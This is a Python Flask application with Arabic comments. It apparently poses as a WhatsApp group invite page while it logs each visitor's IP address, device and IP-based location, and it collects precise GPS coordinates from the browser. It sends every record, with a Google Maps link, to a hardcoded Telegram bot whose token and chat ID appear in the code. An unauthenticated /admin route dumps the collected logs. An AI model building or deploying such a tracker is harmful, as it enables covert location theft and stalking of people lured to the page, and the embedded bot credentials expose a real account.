from flask import Flask, request, jsonify, render_template
import requests
import sqlite3
import datetime
import os
import json

app = Flask(__name__)

# إعدادات التلجرام - استبدل بالقيم الخاصة بك
TELEGRAM_BOT_TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
TELEGRAM_CHAT_ID = "8391968596"

# قاعدة البيانات
def init_db():
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp TEXT,
                  country TEXT,
                  city TEXT,
                  lat REAL,
                  lon REAL,
                  accuracy REAL,
                  platform TEXT,
                  sent_to_telegram BOOLEAN DEFAULT FALSE)''')
    conn.commit()
    conn.close()

init_db()

def send_telegram_message(message):
    """إرسال رسالة إلى التلجرام"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ خطأ في إرسال التلجرام: {e}")
        return False

def get_location_info(ip):
    """الحصول على معلومات الموقع من IP"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return {}

def detect_platform(user_agent):
    """كشف نوع الجهاز"""
    ua = user_agent.lower()
    if 'mobile' in ua:
        platform = '📱 Mobile'
    elif 'tablet' in ua:
        platform = '📟 Tablet'
    else:
        platform = '💻 Desktop'
    
    if 'android' in ua:
        platform += ' (Android)'
    elif 'iphone' in ua or 'ipad' in ua:
        platform += ' (iOS)'
    elif 'windows' in ua:
        platform += ' (Windows)'
    
    return platform

def log_visit(ip, user_agent):
    """تسجيل الزيارة"""
    try:
        platform = detect_platform(user_agent)
        location_info = get_location_info(ip)
        
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                    (ip, user_agent, timestamp, country, city, platform)
                    VALUES (?, ?, ?, ?, ?, ?)''',
                 (ip, user_agent, datetime.datetime.now().isoformat(),
                  location_info.get('country'), location_info.get('city'), platform))
        log_id = c.lastrowid
        conn.commit()
        conn.close()
        
        # إرسال إشعار فوري إلى التلجرام
        message = f"""🚨 <b>زيارة جديدة!</b>

🌐 <b>IP:</b> <code>{ip}</code>
📱 <b>الجهاز:</b> {platform}
📍 <b>الموقع التقريبي:</b> {location_info.get('city', 'غير معروف')}, {location_info.get('country', 'غير معروف')}
🕒 <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔍 <i>بانتظار الموقع الدقيق...</i>"""
        
        send_telegram_message(message)
        return log_id
        
    except Exception as e:
        print(f"❌ خطأ في تسجيل الزيارة: {e}")
        return None

def update_gps_location(log_id, lat, lon, accuracy):
    """تحديث موقع GPS"""
    try:
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''UPDATE logs SET lat = ?, lon = ?, accuracy = ?
                     WHERE id = ?''', (lat, lon, accuracy, log_id))
        conn.commit()
        conn.close()
        
        # الحصول على معلومات الزيارة
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('SELECT * FROM logs WHERE id = ?', (log_id,))
        log = c.fetchone()
        conn.close()
        
        if log:
            # إرسال إشعار الموقع إلى التلجرام
            maps_url = f"https://maps.google.com/?q={lat},{lon}"
            message = f"""🎯 <b>تم الحصول على الموقع الدقيق!</b>

🌐 <b>IP:</b> <code>{log[1]}</code>
📱 <b>الجهاز:</b> {log[9]}
📍 <b>الموقع الدقيق:</b>
   • <b>خط العرض:</b> {lat}
   • <b>خط الطول:</b> {lon}
   • <b>الدقة:</b> {accuracy} متر
   • <b>المدينة:</b> {log[4] or 'غير معروف'}
   • <b>الدولة:</b> {log[5] or 'غير معروف'}

🗺️ <a href="{maps_url}">عرض على خرائط جوجل</a>
🕒 <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
            
            send_telegram_message(message)
            return True
            
    except Exception as e:
        print(f"❌ خطأ في تحديث الموقع: {e}")
        return False

@app.route('/')
def home():
    """الصفحة الرئيسية - مجموعة واتساب + تتبع"""
    # تسجيل الزيارة فوراً
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    
    log_id = log_visit(visitor_ip, user_agent)
    
    return render_template('index.html', log_id=log_id)

@app.route('/get-location', methods=['POST'])
def get_location():
    """طلب الموقع من المتصفح"""
    try:
        data = request.json
        log_id = data.get('log_id')
        
        if not log_id:
            return jsonify({'status': 'error', 'message': 'No log ID'})
        
        # محاولة الحصول على الموقع
        return jsonify({
            'status': 'success',
            'message': 'طلب الموقع جاهز',
            'log_id': log_id
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/save-location', methods=['POST'])
def save_location():
    """حفظ الموقع المستلم"""
    try:
        data = request.json
        log_id = data.get('log_id')
        lat = data.get('lat')
        lon = data.get('lon')
        accuracy = data.get('accuracy')
        
        print(f"📍 تم استقبال الموقع: {lat}, {lon} (دقة: {accuracy}m)")
        
        if log_id and lat and lon:
            success = update_gps_location(log_id, lat, lon, accuracy)
            if success:
                return jsonify({'status': 'success', 'message': 'تم حفظ الموقع وإرساله للتلجرام'})
        
        return jsonify({'status': 'error', 'message': 'بيانات ناقصة'})
        
    except Exception as e:
        print(f"❌ خطأ في حفظ الموقع: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/admin')
def admin():
    """لوحة التحكم"""
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY id DESC LIMIT 50')
    logs = c.fetchall()
    conn.close()
    
    return jsonify([{
        'id': log[0],
        'ip': log[1],
        'user_agent': log[2],
        'timestamp': log[3],
        'country': log[4],
        'city': log[5],
        'lat': log[6],
        'lon': log[7],
        'accuracy': log[8],
        'platform': log[9]
    } for log in logs])

@app.route('/test-telegram')
def test_telegram():
    """اختبار إرسال التلجرام"""
    message = "🔔 <b>اختبار البوت!</b>\n\nهذه رسالة اختبار من نظام التتبع.\n\n✅ البوت يعمل بشكل صحيح!"
    success = send_telegram_message(message)
    return jsonify({'status': 'success' if success else 'error'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print("🚀 نظام التتبع يعمل!")
    print("📧 البوت: Arab9919_bot")
    print("👤 معرف التلجرام: 8391968596")
    app.run(host='0.0.0.0', port=port, debug=False)
